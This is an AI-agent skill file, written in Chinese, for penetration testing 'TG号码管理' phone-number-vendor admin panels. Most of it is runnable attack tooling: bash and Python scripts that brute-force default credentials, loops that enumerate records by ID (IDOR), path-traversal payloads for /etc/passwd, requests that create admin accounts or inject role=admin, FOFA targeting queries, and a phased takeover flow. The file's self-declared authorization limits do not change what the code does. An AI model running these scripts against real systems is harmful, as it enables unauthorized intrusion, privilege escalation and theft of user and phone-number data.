---
name: 太白云生·号册主府
category: business-logic
priority: P1
description: >-
  号商「TG号码管理」后台（FOFA 标题族，同源码多实例）。用户或现场出现：
  TG号码管理、TG号码、admin123、/export/download/、/settings/user/add、
  phone_numbers、export_items、号段导入导出时立刻使用。
  默认跑 tg_number_admin_probe。禁止改原超管密、禁止百万拖号。
  本机 session 号库走 tg-account-library；云控走 tg-cloud-panel。
metadata:
  tags:
    - telegram
    - tg-number
    - admin-panel
    - default-credential
    - idor
    - export-download
    - phone-number
    - number-shop
    - fofa
    - enumeration
    - path-traversal
    - bulk-export
  score: 6
  version: "2.0"
  updated: "2026-09-04"
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# TG 号码管理系统渗透（Cursor Skill · score≥5 实战级）

> **定位**：针对号商「TG号码管理」后台（FOFA 标题族，同源码多实例）的完整渗透卡。
> 涵盖默认口令、`/export/download/` 路径遍历、号商系统指纹、IDOR、批量导出、
> 用户枚举、权限提升等攻击面。

---

## 0. 硬闸

1. 目标必须在 `授权范围`。
2. **禁止改原超管密码**。
3. **禁止百万拖号**——`export/download` 只证明能下（头 + 80 字节）。
4. 植号/改密**先问**。
5. FOFA 必须带授权 `host=` / `ip=`，**禁止无域全网扫**。
6. 本机 session 号库走 `tg-account-library`；云控走 `tg-cloud-panel`。

---

## 1. 真源 & 关联

| 资料 | 路径 |
|------|------|
| Playbook | `传承/飞鸽·号册主府.md` |
| 探针 | `炼蛊房/tg_number_admin_probe.py` |
| 上游 | `case-triage` → 定级后分发 |
| 下游 | `tg-account-library` — 本机 session 号库 |
| 下游 | `tg-cloud-panel` — 云控面板 |
| 下游 | `tg-bot-webhook-hijack` — Bot Token 接管 |
| 横切 | `auth-brute` — 弱口令爆破 |
| 横切 | `sensitive-dir-dump` — 目录遍历 |

---

## 2. 号商系统指纹识别

### 2.1 指纹特征矩阵

| # | 指纹 | 位置 | 置信度 | 说明 |
|---|------|------|--------|------|
| F1 | `<title>TG号码管理</title>` | HTML title | 极高 | FOFA 标题族核心指纹 |
| F2 | `/export/download/` 端点 | URL 路径 | 高 | 批量导出功能 |
| F3 | `/settings/user/add` 端点 | URL 路径 | 高 | 用户管理 |
| F4 | `/api/phone_numbers` | API 路由 | 高 | 号码 CRUD |
| F5 | `export_items` 参数 | 请求参数 | 高 | 导出字段控制 |
| F6 | `/login` + `admin/admin123` | 默认口令 | 极高 | 多实例共用 |
| F7 | `/api/statistics` | API 路由 | 中 | 统计面板 |
| F8 | `/api/segments` | API 路由 | 中 | 号段管理 |
| F9 | 中文管理界面 + VUE/React 前端 | 前端框架 | 中 | SPA 架构 |
| F10 | `/api/import/upload` | API 路由 | 高 | 批量导入 |

### 2.2 指纹识别命令

```bash
# ── 一键指纹（推荐） ──
python3 炼蛊房/tg_number_admin_probe.py doctor
python3 炼蛊房/tg_number_admin_probe.py --base https://授权实例 --case <案>

# ── 手动指纹 ──
# 标题检测
curl -sk "https://TARGET/" | grep -oiP '<title>[^<]*</title>'

# 关键路径探测
for path in "/login" "/api/phone_numbers" "/export/download/" \
            "/settings/user/add" "/api/statistics" "/api/segments" \
            "/api/import/upload" "/api/users"; do
  code=$(curl -sk "https://TARGET${path}" -o /dev/null -w '%{http_code}' \
         --connect-timeout 5 --max-time 10)
  echo "$path → $code"
done

# JS 指纹
curl -sk "https://TARGET/" \
  | grep -oP 'src="[^"]*\.js"' \
  | head -5 \
  | while read -r src; do
      url=$(echo "$src" | grep -oP '"[^"]*"' | tr -d '"')
      echo "=== $url ==="
      curl -sk "https://TARGET${url}" \
        | grep -oiP 'phone_numbers|export_items|segments|tg号码|号段' \
        | head -5
    done
```

---

## 3. 实战命令

### 3.1 默认口令突破

```bash
# ── 默认口令矩阵 ──
# 同源码多实例常见默认凭据
CREDS=(
  "admin:admin123"
  "admin:123456"
  "admin:admin"
  "admin:password"
  "admin:admin888"
  "root:root"
  "root:123456"
  "test:test123"
  "demo:demo123"
  "operator:operator"
)

for cred in "${CREDS[@]}"; do
  user="${cred%%:*}"
  pass="${cred#*:}"
  resp=$(curl -sk "https://TARGET/api/login" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
    --connect-timeout 5 --max-time 10 \
    -w '\n%{http_code}')
  code=$(echo "$resp" | tail -1)
  body=$(echo "$resp" | head -1)
  if echo "$body" | grep -qiP '"(token|access_token|session|success.*true|code.*0)"'; then
    echo "[+] VALID: $user:$pass → $body"
    break
  else
    echo "[-] FAIL:  $user:$pass → HTTP $code"
  fi
done
```

```python
#!/usr/bin/env python3
"""tg_number_default_creds.py - 号商系统默认口令探测"""
import requests, sys, urllib3
urllib3.disable_warnings()

TARGET = sys.argv[1]  # https://target

CREDS = [
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin888"),
    ("root", "root"),
    ("root", "123456"),
    ("test", "test123"),
]

LOGIN_PATHS = [
    "/api/login",
    "/api/auth/login",
    "/login",
    "/api/v1/auth/login",
    "/api/user/login",
]

session = requests.Session()
session.verify = False

for path in LOGIN_PATHS:
    url = f"{TARGET}{path}"
    for user, pwd in CREDS:
        try:
            r = session.post(url, json={"username": user, "password": pwd}, timeout=10)
            if r.status_code == 200:
                data = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
                if data.get("token") or data.get("access_token") or data.get("code") == 0:
                    print(f"[+] VALID {path}: {user}:{pwd}")
                    print(f"    Token: {data.get('token', data.get('access_token', 'N/A'))[:80]}")
                    sys.exit(0)
        except Exception as e:
            pass
    print(f"[-] {path}: all creds failed")

print("[-] No default credentials worked")
```

### 3.2 /export/download/ 路径遍历与批量导出

```bash
# ── 导出端点探测 ──
curl -sk "https://TARGET/export/download/" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null -w '%{http_code}\n'

# ── 导出参数枚举 ──
# 常见导出格式
for fmt in "csv" "xlsx" "json" "txt"; do
  curl -sk "https://TARGET/export/download/?format=$fmt" \
    -H "Authorization: Bearer $TOKEN" \
    -o /tmp/tg_export_test.$fmt \
    -w "format=$fmt → HTTP %{http_code}, size=%{size_download}\n"
done

# ── 只取头 80 字节证明可下载（硬闸：不拖全量） ──
curl -sk "https://TARGET/export/download/?format=csv" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Range: bytes=0-79" \
  -o /tmp/tg_export_head.csv
echo "[*] First 80 bytes:"
cat /tmp/tg_export_head.csv
file /tmp/tg_export_head.csv

# ── 导出字段控制（export_items 参数） ──
curl -sk "https://TARGET/export/download/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"export_items":["phone","username","status"],"limit":5}' \
  | head -c 200

# ── 路径遍历尝试 ──
for payload in "../etc/passwd" "..%2Fetc%2Fpasswd" \
               "....//etc/passwd" "%2e%2e%2fetc%2fpasswd"; do
  code=$(curl -sk "https://TARGET/export/download/$payload" \
    -o /dev/null -w '%{http_code}' --connect-timeout 5)
  echo "export/download/$payload → $code"
done
```

### 3.3 IDOR — 用户/号码水平越权

```bash
# ── 号码 ID 枚举 ──
TOKEN="登录后获取的token"

# 遍历号码 ID（通常为自增整数）
for id in $(seq 1 20); do
  resp=$(curl -sk "https://TARGET/api/phone_numbers/$id" \
    -H "Authorization: Bearer $TOKEN" \
    -w '\n%{http_code}')
  code=$(echo "$resp" | tail -1)
  body=$(echo "$resp" | head -1)
  if [ "$code" = "200" ]; then
    echo "[+] ID=$id: $body" | head -c 150
    echo
  fi
done

# ── 用户 ID 枚举 ──
for uid in $(seq 1 10); do
  resp=$(curl -sk "https://TARGET/api/users/$uid" \
    -H "Authorization: Bearer $TOKEN" \
    -w '\n%{http_code}')
  code=$(echo "$resp" | tail -1)
  if [ "$code" = "200" ]; then
    echo "[+] User ID=$uid: $(echo "$resp" | head -1 | head -c 150)"
  fi
done

# ── 号段 ID 枚举 ──
for sid in $(seq 1 10); do
  resp=$(curl -sk "https://TARGET/api/segments/$sid" \
    -H "Authorization: Bearer $TOKEN" \
    -w '\n%{http_code}')
  code=$(echo "$resp" | tail -1)
  if [ "$code" = "200" ]; then
    echo "[+] Segment ID=$sid: $(echo "$resp" | head -1 | head -c 150)"
  fi
done
```

```python
#!/usr/bin/env python3
"""tg_number_idor_scan.py - 号商系统 IDOR 枚举"""
import requests, sys, json, urllib3
urllib3.disable_warnings()

TARGET = sys.argv[1]  # https://target
TOKEN = sys.argv[2]   # JWT or session token

ENDPOINTS = [
    "/api/phone_numbers/{id}",
    "/api/users/{id}",
    "/api/segments/{id}",
    "/api/export/task/{id}",
    "/api/orders/{id}",
]

session = requests.Session()
session.verify = False
session.headers["Authorization"] = f"Bearer {TOKEN}"

for endpoint in ENDPOINTS:
    print(f"\n=== {endpoint} ===")
    found = 0
    for i in range(1, 21):
        url = f"{TARGET}{endpoint.format(id=i)}"
        try:
            r = session.get(url, timeout=10)
            if r.status_code == 200:
                data = r.text[:120]
                print(f"  [+] id={i}: {data}")
                found += 1
            elif r.status_code == 403:
                print(f"  [=] id={i}: 403 (exists but forbidden)")
        except Exception:
            pass
    print(f"  Total found: {found}")
```

### 3.4 用户枚举与权限提升

```bash
# ── 用户列表接口（可能无需认证或低权可访） ──
curl -sk "https://TARGET/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool | head -40

# ── 添加用户（权限提升，先问） ──
# 注意：此操作需要先问用户
curl -sk "https://TARGET/settings/user/add" \
  -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "username": "audit_test",
    "password": "AuditTest123!",
    "role": "admin"
  }' -w '\nHTTP %{http_code}\n'

# ── 角色字段篡改（注册时附加 role） ──
curl -sk "https://TARGET/api/register" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "username": "test_escalation",
    "password": "Test123456!",
    "role": "admin"
  }' -w '\nHTTP %{http_code}\n'

# ── 统计信息泄露（无需高权限） ──
curl -sk "https://TARGET/api/statistics" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool
```

### 3.5 批量导入功能探测

```bash
# ── 导入端点 ──
curl -sk "https://TARGET/api/import/upload" \
  -X POST -H "Authorization: Bearer $TOKEN" \
  -F "file=@/dev/null;filename=test.csv" \
  -w '\nHTTP %{http_code}\n'

# ── 模板下载（看字段格式） ──
curl -sk "https://TARGET/api/import/template" \
  -H "Authorization: Bearer $TOKEN" \
  -o /tmp/tg_import_template.csv
cat /tmp/tg_import_template.csv
```

### 3.6 未授权访问检测

```bash
# ── 不带 token 直接访问敏感接口 ──
for path in "/api/phone_numbers" "/api/users" "/api/statistics" \
            "/api/segments" "/export/download/" "/api/import/template" \
            "/api/orders" "/api/settings"; do
  code=$(curl -sk "https://TARGET${path}" -o /dev/null -w '%{http_code}' \
         --connect-timeout 5)
  if [ "$code" = "200" ]; then
    echo "[!] UNAUTH: $path → 200"
  else
    echo "[-] $path → $code"
  fi
done
```

---

## 4. 完整打击流程

```
Phase-0 指纹确认
│ tg_number_admin_probe.py doctor
│ tg_number_admin_probe.py --base → 确认是号商系统
│ 手动指纹验证（§2.2）
│
Phase-1 默认口令
│ admin/admin123 矩阵（§3.1）
│ 常见弱口令碰撞
│ 成功 → 拿 token → Phase-2
│ 失败 → 未授权访问检测（§3.6）
│
Phase-2 功能枚举
│ 导出功能（§3.2）→ 只取头 80 字节证明
│ 用户列表（§3.4）→ 枚举用户名和角色
│ 统计信息（§3.4）→ 看号码总量
│ 导入功能（§3.5）→ 模板下载看字段
│
Phase-3 IDOR
│ 号码 ID 遍历（§3.3）→ 水平越权
│ 用户 ID 遍历（§3.3）→ 读其他用户
│ 号段 ID 遍历（§3.3）→ 读他人号段
│
Phase-4 权限提升
│ 注册时附 role=admin（§3.4）
│ 低权用户访问管理接口
│ /settings/user/add（先问）
│
Phase-5 路径遍历
│ /export/download/../ 尝试（§3.2）
│ 目录遍历变体
│
Phase-6 证据固化
│ 截图/响应保存到 案卷/<案>/接管/
│ 更新 STATUS.md
│ 只证明能下（禁止百万拖号）
```

---

## 5. 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L1 指纹 | 确认是 TG 号码管理系统（标题/路径/接口匹配） | 只有 login 页面 |
| L2 进入 | 默认口令登录成功 / 未授权访问敏感接口 / IDOR 读到他人号码 | 只扫到 login 页 |
| L3 接管 | 提权到 admin / 可导出号码（头 80 字节证明） / 可管理用户 | 改原超管密码 / 百万拖号 |

---

## 6. FOFA 查询模板

```
# 必须带授权域名，禁止无域全网扫
title="TG号码管理" && host="授权域名"
title="TG号码" && host="授权域名"
body="/export/download" && host="授权域名"
body="phone_numbers" && title="管理" && host="授权域名"
```

---

## 7. 常见漏洞汇总

| # | 漏洞 | 类型 | 影响 | 检测命令参考 |
|---|------|------|------|-------------|
| V1 | admin/admin123 默认口令 | 弱口令 | 后台完全控制 | §3.1 |
| V2 | /export/download/ 无鉴权 | 未授权访问 | 批量号码泄露 | §3.2 |
| V3 | /api/phone_numbers/{id} IDOR | 水平越权 | 读取任意号码 | §3.3 |
| V4 | /api/users/{id} IDOR | 水平越权 | 读取任意用户 | §3.3 |
| V5 | 注册时 role=admin | 垂直越权 | 提权到管理员 | §3.4 |
| V6 | /api/statistics 无鉴权 | 信息泄露 | 号码总量/统计 | §3.6 |
| V7 | /export/download/../ | 路径遍历 | 服务器文件读取 | §3.2 |
| V8 | /api/import/upload 无校验 | 任意上传 | 潜在 RCE | §3.5 |

---

## 8. 上下游 Skill

| 方向 | Skill | 说明 |
|------|-------|------|
| 上游 | `case-triage` | 定级后分发 |
| 上游 | `sensitive-dir-dump` | 目录扫描发现 |
| 上游 | `tma-web-asset-discovery` | FOFA 侦察发现 |
| 下游 | `tg-account-library` | 本机 session 号库管理 |
| 下游 | `tg-cloud-panel` | 云控面板渗透 |
| 下游 | `tg-bot-webhook-hijack` | Bot Token 接管 |
| 横切 | `auth-brute` | 弱口令爆破工具 |
| 横切 | `idor-testing` | IDOR 通用手法 |
| 横切 | `file-upload-testing` | 上传功能深度 |
| 横切 | `mass-assignment` | 批量赋值（role 提权） |
| 工具 | `炼蛊房/tg_number_admin_probe.py` | 自动化探针 |
| Playbook | `传承/飞鸽·号册主府.md` | 接管手法 |

---

## 9. FAQ

1. **Q: 和 `tg-account-library` 什么关系？**
   A: 本卡打的是号商的 **Web 管理后台**（多实例同源码）；`tg-account-library` 管理的是 **本机** `_tg_accounts/` 下的 session 文件。

2. **Q: 和 `tg-cloud-panel` 什么关系？**
   A: 本卡是号商 CRUD 管理后台，`tg-cloud-panel` 是 Sticker/Fernet/WASM 等 TG 云控面板。指纹不同。

3. **Q: 可以拖全量号码吗？**
   A: **禁止**百万拖号。`export/download` 只取头 + 80 字节证明能下，截图留证。

4. **Q: 可以改管理员密码吗？**
   A: **禁止**改原超管密码。证明弱口令登录成功即可（L2）。需要提权时用注册新号 + role=admin 方式。

5. **Q: FOFA 怎么搜？**
   A: 必须带 `host=` / `ip=`。`title="TG号码管理" && host="授权域名"`。禁止无域全网扫。
